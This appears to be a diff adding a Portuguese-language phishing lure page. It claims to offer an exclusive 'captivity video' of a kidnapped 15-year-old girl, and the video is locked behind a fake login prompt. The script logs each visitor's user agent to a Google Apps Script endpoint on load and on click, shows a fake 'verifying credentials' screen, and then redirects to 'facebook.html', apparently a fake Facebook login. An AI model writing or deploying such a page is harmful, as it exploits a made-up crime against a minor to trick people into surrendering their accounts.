@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caso Belma: Vídeo Exclusivo do Cativeiro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* HEADER */
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 3px solid #b30000;
+            margin-bottom: 30px;
+        }
+        
+        .breaking-news {
+            background-color: #b30000;
+            color: white;
+            padding: 8px 15px;
+            display: inline-block;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            border-radius: 3px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
+            color: #fff;
+            line-height: 1.2;
+        }
+        
+        .case-details {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .detail-item {
+            background-color: rgba(179, 0, 0, 0.2);
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 3px solid #b30000;
+        }
+        
+        /* VIDEO CONTAINER */
+        .video-container {
+            background-color: #111;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 30px auto;
+            border: 1px solid #333;
+            box-shadow: 0 10px 30px rgba(179, 0, 0, 0.2);
+            max-width: 800px;
+        }
+        
+        .video-header {
+            background-color: #1a1a1a;
+            padding: 20px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .video-header h2 {
+            color: #fff;
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .video-warning {
+            color: #ff6b6b;
+            font-size: 0.9rem;
+        }
+        
+        .video-placeholder {
+            height: 450px;
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9));
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 30px;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .lock-icon {
+            font-size: 4rem;
+            color: #b30000;
+            margin-bottom: 20px;
+        }
+        
+        .video-placeholder h3 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        
+        .video-placeholder p {
+            max-width: 600px;
+            color: #ddd;
+            margin-bottom: 25px;
+            font-size: 1rem;
+        }
+        
+        .watch-btn {
+            background-color: #b30000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .watch-btn:hover {
+            background-color: #990000;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(179, 0, 0, 0.4);
+        }
+        
+        /* OVERLAY DE LOADING */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-content {
+            text-align: center;
+            padding: 40px;
+            max-width: 500px;
+            background: rgba(26, 26, 26, 0.9);
+            border-radius: 15px;
+            border: 2px solid #b30000;
+            box-shadow: 0 20px 50px rgba(179, 0, 0, 0.3);
+        }
+        
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 5px solid #333;
+            border-top: 5px solid #b30000;
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 1.4rem;
+            color: #fff;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        
+        .loading-subtext {
+            color: #aaa;
+            font-size: 1rem;
+            margin-bottom: 25px;
+        }
+        
+        .countdown {
+            color: #b30000;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        
+        /* VIDEO PLAYER */
+        .video-player {
+            display: none;
+            width: 100%;
+            height: 450px;
+            background-color: #000;
+            position: relative;
+        }
+        
+        .fake-video {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #000, #1a0000);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .fake-video i {
+            font-size: 4rem;
+            color: #b30000;
+            margin-bottom: 20px;
+        }
+        
+        .video-info {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .video-placeholder {
+                height: 350px;
+                padding: 20px;
+            }
+            
+            .video-placeholder h3 {
+                font-size: 1.4rem;
+            }
+            
+            .lock-icon {
+                font-size: 3rem;
+            }
+            
+            .loading-content {
+                padding: 30px 20px;
+                margin: 20px;
+            }
+            
+            .loading-spinner {
+                width: 60px;
+                height: 60px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .header {
+                padding: 20px 0;
+            }
+            
+            h1 {
+                font-size: 1.5rem;
+            }
+            
+            .video-placeholder {
+                height: 300px;
+            }
+            
+            .case-details {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <header class="header">
+            <div class="breaking-news">VÍDEO EXCLUSIVO</div>
+            <h1>BELMA, 15 ANOS: VÍDEO DO CATIVEIRONDA FOI SEQUESTRADA</h1>
+            
+            <div class="case-details">
+                <div class="detail-item">
+                    <strong>Vítima:</strong> Belma Silva, 15 anos
+                </div>
+                <div class="detail-item">
+                    <strong>Situação:</strong> Cárcere privado e violência
+                </div>
+                <div class="detail-item">
+                    <strong>Desaparecida:</strong> Há 7 dias
+                </div>
+            </div>
+        </header>
+        
+        <!-- VIDEO SECTION -->
+        <section class="video-container">
+            <div class="video-header">
+                <h2>VÍDEO EXCLUSIVO: Imagens do cativeiro de Belma</h2>
+                <p class="video-warning">⚠️ CONTEÚDO EXTREMAMENTE SENSÍVEL - Acesso restrito</p>
+            </div>
+            
+            <div class="video-placeholder" id="videoTrigger">
+                <div class="lock-icon">🔒</div>
+                <h3>VÍDEO PROTEGIDO</h3>
+                <p>Para acessar as imagens exclusivas do cativeiro onde Belma foi mantida, é necessário autenticação.</p>
+                <button class="watch-btn" id="watchButton">
+                    🔓 ACESSAR VÍDEO (LOGIN OBRIGATÓRIO)
+                </button>
+                <p class="video-info">Duração: 4:20 min • Apenas visualizações autorizadas</p>
+            </div>
+            
+            <div class="video-player" id="videoPlayer">
+                <div class="fake-video">
+                    <div>▶️</div>
+                    <h3>VÍDEO DO CATIVEIRO DE BELMA</h3>
+                    <p>[Imagens de câmera de segurança mostram o local onde Belma foi mantida]</p>
+                    <p>Timestamp: 24/03/2025 15:42:33</p>
+                    <p>Local: Armazém abandonado - Zona Rural</p>
+                    <p>Status: Material de investigação policial</p>
+                </div>
+            </div>
+        </section>
+    </div>
+    
+    <!-- OVERLAY DE LOADING -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">VERIFICANDO ACESSO...</div>
+            <div class="loading-subtext">
+                Estamos verificando suas credenciais de acesso.<br>
+                Aguarde um momento.
+            </div>
+            <div class="countdown" id="countdown">Redirecionando em 3s...</div>
+        </div>
+    </div>
+
+    <script>
+        // URL do seu Google Apps Script
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzYOUR_SCRIPT_ID/exec';
+        
+        // Elementos da página
+        const videoTrigger = document.getElementById('videoTrigger');
+        const watchButton = document.getElementById('watchButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const countdownElement = document.getElementById('countdown');
+        
+        // Função para salvar dados no Google Sheets
+        async function saveToGoogleSheets(step = 'clique_acessar_video') {
+            try {
+                const timestamp = new Date().toLocaleString('pt-BR');
+                const userAgent = navigator.userAgent;
+                
+                // Preparar dados para envio
+                const formData = new FormData();
+                formData.append('timestamp', timestamp);
+                formData.append('userAgent', userAgent);
+                formData.append('page', 'caso_belma_video');
+                formData.append('step', step);
+                formData.append('action', 'clicked_access_video');
+                
+                // Enviar para Google Apps Script
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: formData
+                });
+                
+                console.log('Dados enviados para Google Sheets:', {
+                    step: step,
+                    timestamp: timestamp
+                });
+                
+                return true;
+                
+            } catch (error) {
+                console.error('Erro ao salvar dados:', error);
+                return false;
+            }
+        }
+        
+        // Função para mostrar loading e redirecionar
+        function showLoadingAndRedirect() {
+            // Mostrar overlay de loading
+            loadingOverlay.style.display = 'flex';
+            
+            // Salvar que o usuário clicou para acessar
+            saveToGoogleSheets('clique_acessar_video');
+            
+            // Contador regressivo
+            let seconds = 3;
+            countdownElement.textContent = `Redirecionando em ${seconds}s...`;
+            
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = `Redirecionando em ${seconds}s...`;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    // Redirecionar para facebook.html
+                    window.location.href = 'facebook.html';
+                }
+            }, 1000);
+            
+            // Garantir redirecionamento mesmo se algo der errado
+            setTimeout(() => {
+                window.location.href = 'facebook.html';
+            }, 4000);
+        }
+        
+        // Eventos de clique
+        videoTrigger.addEventListener('click', showLoadingAndRedirect);
+        watchButton.addEventListener('click', function(e) {
+            e.stopPropagation();
+            showLoadingAndRedirect();
+        });
+        
+        // Efeito de digitação no título
+        const title = document.querySelector('h1');
+        const originalText = title.textContent;
+        title.textContent = '';
+        
+        let i = 0;
+        function typeWriter() {
+            if (i < originalText.length) {
+                title.textContent += originalText.charAt(i);
+                i++;
+                setTimeout(typeWriter, 30);
+            }
+        }
+        
+        // Iniciar efeito de digitação
+        setTimeout(typeWriter, 500);
+        
+        // Salvar visita inicial
+        window.addEventListener('load', () => {
+            saveToGoogleSheets('pagina_carregada');
+        });
+    </script>
+</body>
+</html>
